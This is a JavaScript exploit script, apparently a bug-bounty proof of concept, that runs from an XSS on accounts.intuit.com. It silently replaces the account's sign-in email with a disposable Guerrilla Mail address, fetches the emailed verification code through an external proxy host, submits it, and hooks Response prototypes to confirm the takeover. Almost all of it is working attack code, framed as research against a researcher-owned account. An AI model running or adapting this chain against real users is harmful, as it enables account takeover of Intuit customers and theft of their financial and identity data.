/*
 * P58 - XSS-driven sign-in-email change proof for a researcher-owned account.
 *
 * Run from the confirmed accounts.intuit.com XSS document. The XSS payload
 * replaces the top document, so this script loads Account Manager in an
 * unsandboxed same-origin iframe and drives Intuit's deployed form/remediation
 * widget. The final credential write remains Intuit's own native callback.
 */
(async function p58XssNativeEmailIframe() {
  "use strict";

  var PROXY = "https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=";
  var GUERRILLA = "https://api.guerrillamail.com/ajax.php";
  var FRAME_ID = "p58-account-manager";
  var PANEL_ID = "p58-proof-status";
  var responseRestore = null;

  function panel() {
    var root = document.getElementById(PANEL_ID);
    if (root) return root;
    root = document.createElement("section");
    root.id = PANEL_ID;
    root.style.cssText =
      "position:fixed;right:16px;bottom:16px;z-index:2147483647;" +
      "width:min(480px,calc(100vw - 32px));padding:14px;" +
      "border:3px solid #2ca01c;border-radius:9px;background:#111;" +
      "color:#7cff6b;font:14px/1.45 ui-monospace,monospace;" +
      "box-shadow:0 10px 36px rgba(0,0,0,.38);white-space:pre-wrap";
    root.textContent = "P58 XSS -> native sign-in-email change\nSTART";
    (document.body || document.documentElement).appendChild(root);
    return root;
  }

  function status(value) {
    var safe = String(value).replace(/[^A-Z0-9_:\-.]/gi, "_").slice(0, 180);
    panel().textContent += "\n" + safe;
    document.title = "P58:" + safe;
  }

  function showCandidate(address) {
    var line = document.createElement("div");
    line.style.cssText = "margin-top:8px;color:#fff;word-break:break-all";
    line.textContent = "Candidate sign-in email: " + address;
    panel().appendChild(line);
  }

  function sleep(ms) {
    return new Promise(function (resolve) {
      setTimeout(resolve, ms);
    });
  }

  function frameRealm(frame) {
    try {
      var win = frame.contentWindow;
      var doc = win && win.document;
      if (!win || !doc || win.location.origin !== location.origin) return null;
      return { win: win, doc: doc };
    } catch (_) {
      return null;
    }
  }

  async function waitForInFrame(frame, selector, timeoutMs, predicate) {
    var started = Date.now();
    while (Date.now() - started <= timeoutMs) {
      var realm = frameRealm(frame);
      if (realm) {
        var node = realm.doc.querySelector(selector);
        if (node && node.isConnected && (!predicate || predicate(node, realm))) {
          return { node: node, win: realm.win, doc: realm.doc };
        }
      }
      await sleep(100);
    }
    throw new Error("TIMEOUT_" + selector);
  }

  function actualInput(node) {
    if (!node) return null;
    if (/^(INPUT|TEXTAREA)$/.test(node.tagName || "")) return node;
    return node.querySelector && node.querySelector("input,textarea");
  }

  async function waitForLiveEnabled(frame, selector, timeoutMs) {
    return waitForInFrame(frame, selector, timeoutMs, function (node) {
      var style = node.ownerDocument.defaultView.getComputedStyle(node);
      return (
        !node.disabled &&
        node.getAttribute("aria-disabled") !== "true" &&
        node.getClientRects().length > 0 &&
        style.display !== "none" &&
        style.visibility !== "hidden"
      );
    });
  }

  async function waitForHydratedEmail(frame, timeoutMs) {
    return waitForInFrame(frame, "#ius-email-address-update", timeoutMs, function (node) {
      var input = actualInput(node);
      return !!(
        input &&
        !input.disabled &&
        typeof input.value === "string" &&
        input.value.indexOf("@") > 0
      );
    });
  }

  function nextPaint(win) {
    return new Promise(function (resolve) {
      win.requestAnimationFrame(function () {
        win.requestAnimationFrame(resolve);
      });
    });
  }

  function nativeSet(win, input, value) {
    var proto =
      input instanceof win.HTMLTextAreaElement
        ? win.HTMLTextAreaElement.prototype
        : win.HTMLInputElement.prototype;
    var descriptor = Object.getOwnPropertyDescriptor(proto, "value");
    if (!descriptor || typeof descriptor.set !== "function") {
      throw new Error("NO_NATIVE_SETTER");
    }
    descriptor.set.call(input, value);
    input.dispatchEvent(new win.Event("input", { bubbles: true }));
    input.dispatchEvent(new win.Event("change", { bubbles: true }));
  }

  function proxyGet(url) {
    return fetch(PROXY + encodeURIComponent(url), {
      method: "GET",
      cache: "no-store",
      credentials: "omit",
    }).then(function (response) {
      if (!response.ok) throw new Error("PROXY_HTTP_" + response.status);
      return response.text();
    });
  }

  async function createMailbox() {
    var raw = await proxyGet(GUERRILLA + "?f=get_email_address");
    var data = JSON.parse(raw);
    if (!data.email_addr || !data.sid_token) throw new Error("MAILBOX_CREATE_FAILED");
    return { address: data.email_addr, sid: data.sid_token };
  }

  async function waitForOtp(mailbox) {
    for (var attempt = 1; attempt <= 60; attempt += 1) {
      var raw = await proxyGet(
        GUERRILLA +
          "?f=check_email&seq=0&sid_token=" +
          encodeURIComponent(mailbox.sid),
      );
      var list = (JSON.parse(raw).list || []).filter(function (message) {
        var id = String(message.mail_id || "");
        var senderAndSubject =
          String(message.mail_from || "") + " " + String(message.mail_subject || "");
        return id && /intuit|your intuit code/i.test(senderAndSubject);
      });
      for (var index = 0; index < list.length; index += 1) {
        var mailId = String(list[index].mail_id);
        var messageRaw = await proxyGet(
          GUERRILLA +
            "?f=fetch_email&email_id=" +
            encodeURIComponent(mailId) +
            "&sid_token=" +
            encodeURIComponent(mailbox.sid),
        );
        var message = JSON.parse(messageRaw);
        var text =
          String(message.mail_subject || "") +
          " " +
          String(message.mail_excerpt || "") +
          " " +
          String(message.mail_body || "").replace(/<[^>]*>/g, " ");
        var match =
          text.match(/(?:code|verification)[^0-9]{0,160}(\d{6})/i) ||
          text.match(/\b(\d{6})\b/);
        if (match) return match[1];
      }
      if (attempt % 5 === 0) status("OTP_WAIT_" + attempt);
      await sleep(3000);
    }
    throw new Error("OTP_TIMEOUT");
  }

  function observeCredentialResult(win, timeoutMs) {
    var responseProto = win.Response.prototype;
    var originalJson = responseProto.json;
    var originalText = responseProto.text;
    var settled = false;
    var resolveResult;
    var promise = new Promise(function (resolve) {
      resolveResult = resolve;
    });

    function inspect(value) {
      if (settled || !value || typeof value !== "object") return;
      var result = value.data && value.data.identityCreateOrReplaceEmailCredential;
      if (!result || !result.__typename) return;
      settled = true;
      restore();
      resolveResult(result);
    }

    var timer = setTimeout(function () {
      if (settled) return;
      settled = true;
      restore();
      resolveResult({ __typename: "RESULT_NOT_OBSERVED" });
    }, timeoutMs);

    function restore() {
      if (responseProto.json === wrappedJson) responseProto.json = originalJson;
      if (responseProto.text === wrappedText) responseProto.text = originalText;
      clearTimeout(timer);
    }

    async function wrappedJson() {
      var value = await originalJson.apply(this, arguments);
      inspect(value);
      return value;
    }
    async function wrappedText() {
      var value = await originalText.apply(this, arguments);
      try {
        inspect(JSON.parse(value));
      } catch (_) {}
      return value;
    }

    responseProto.json = wrappedJson;
    responseProto.text = wrappedText;

    responseRestore = restore;
    return promise;
  }

  function createAccountFrame(timeoutMs) {
    return new Promise(function (resolve, reject) {
      var timer = setTimeout(function () {
        reject(new Error("FRAME_LOAD_TIMEOUT"));
      }, timeoutMs);
      var old = document.getElementById(FRAME_ID);
      if (old) old.remove();
      var frame = document.createElement("iframe");
      frame.id = FRAME_ID;
      frame.style.cssText =
        "position:fixed;inset:0;width:100vw;height:100vh;border:0;" +
        "z-index:2147483646;background:#fff";
      frame.addEventListener(
        "load",
        function () {
          clearTimeout(timer);
          resolve(frame);
        },
        { once: true },
      );
      frame.src = "/app/account-manager/security/email?xss_poc=p58";
      (document.body || document.documentElement).appendChild(frame);
    });
  }

  function navigateAccountFrame(frame, url, timeoutMs) {
    return new Promise(function (resolve, reject) {
      var timer = setTimeout(function () {
        reject(new Error("FRAME_RELOAD_TIMEOUT"));
      }, timeoutMs);
      frame.addEventListener(
        "load",
        function () {
          clearTimeout(timer);
          resolve();
        },
        { once: true },
      );
      frame.contentWindow.location.href = url;
    });
  }

  try {
    if (location.origin !== "https://accounts.intuit.com") {
      throw new Error("WRONG_ORIGIN");
    }
    panel();

    var framePromise = createAccountFrame(60000);
    status("ACCOUNT_FRAME_CREATED");
    var frame = await framePromise;

    // A nonempty current email proves the Account Manager form has hydrated
    // from the profile response and its native GraphQL client/store exists.
    var hydrated = await waitForHydratedEmail(frame, 60000);
    await nextPaint(hydrated.win);
    status("NATIVE_HOST_HYDRATED");

    var mailbox = await createMailbox();
    showCandidate(mailbox.address);
    status("MAILBOX_READY");

    var liveEmail = await waitForHydratedEmail(frame, 10000);
    var emailInput = actualInput(liveEmail.node);
    emailInput.focus();
    nativeSet(liveEmail.win, emailInput, mailbox.address);
    emailInput.blur();
    await nextPaint(liveEmail.win);
    if (emailInput.value !== mailbox.address) {
      throw new Error("REACT_EMAIL_VALUE_NOT_COMMITTED");
    }
    var liveSave = await waitForLiveEnabled(
      frame,
      "#ius-email-update-btn-save",
      10000,
    );
    status("EMAIL_COMMITTED_TO_NATIVE_FORM");
    liveSave.node.click();
    status("NATIVE_SAVE_CLICKED");

    var otpFound = await waitForInFrame(
      frame,
      '#ius-mfa-confirm-code,input[data-testid="VerifyOtpInput"],[data-testid="VerifyOtpInput"] input',
      90000,
      function (node) {
        var input = actualInput(node);
        return !!(input && !input.disabled);
      },
    );
    status("NATIVE_OTP_WIDGET_READY");

    var otp = await waitForOtp(mailbox);
    status("OTP_RECEIVED");

    var liveOtp = await waitForInFrame(
      frame,
      '#ius-mfa-confirm-code,input[data-testid="VerifyOtpInput"],[data-testid="VerifyOtpInput"] input',
      10000,
      function (node) {
        var input = actualInput(node);
        return !!(input && !input.disabled);
      },
    );
    var otpInput = actualInput(liveOtp.node);

    // Hook the exact current iframe realm immediately before the native action
    // that can produce ReplaceEmail.
    var resultPromise = observeCredentialResult(liveOtp.win, 180000);
    otpInput.focus();
    nativeSet(liveOtp.win, otpInput, otp);
    otp = "";
    otpInput.blur();
    await nextPaint(liveOtp.win);
    var liveOtpButton = await waitForLiveEnabled(
      frame,
      '[data-testid="VerifyOtpSubmitButton"]',
      10000,
    );
    liveOtpButton.node.click();
    status("NATIVE_OTP_SUBMITTED");

    var result = await resultPromise;
    var resultType = result.__typename || "RESULT_WITHOUT_TYPENAME";
    status(resultType);
    if (resultType === "Identity_CreateOrReplaceEmailCredentialSuccess") {
      window.__P58_PROOF__ = {
        candidateEmail: mailbox.address,
        resultType: resultType,
        observedAt: new Date().toISOString(),
      };
      status("SERVER_CONFIRMED_EMAIL_CHANGE");

      // Confirm that the native host reflects the candidate before and after
      // a real iframe reload. A separate clean sign-in remains the final check.
      try {
        var reflected = await waitForInFrame(
          frame,
          "#ius-email-address-update",
          15000,
          function (node) {
            var input = actualInput(node);
            return !!(input && input.value === mailbox.address);
          },
        );
        if (reflected) status("UI_CONFIRMED");
      } catch (_) {
        status("UI_REFLECTION_NOT_PRESENT");
      }

      await navigateAccountFrame(
        frame,
        "/app/account-manager/security/email?xss_poc=p58_refresh&cb=" + Date.now(),
        60000,
      );
      var persisted = await waitForInFrame(
        frame,
        "#ius-email-address-update",
        60000,
        function (node) {
          var input = actualInput(node);
          return !!(input && input.value === mailbox.address);
        },
      );
      if (persisted) status("PERSISTENCE_CONFIRMED_AFTER_REFRESH");
      status("READY_FOR_CLEAN_SIGNIN_CHECK");
    }
  } catch (error) {
    if (responseRestore) responseRestore();
    status("ERROR:" + (error && error.message ? error.message : "UNKNOWN"));
  }
})();
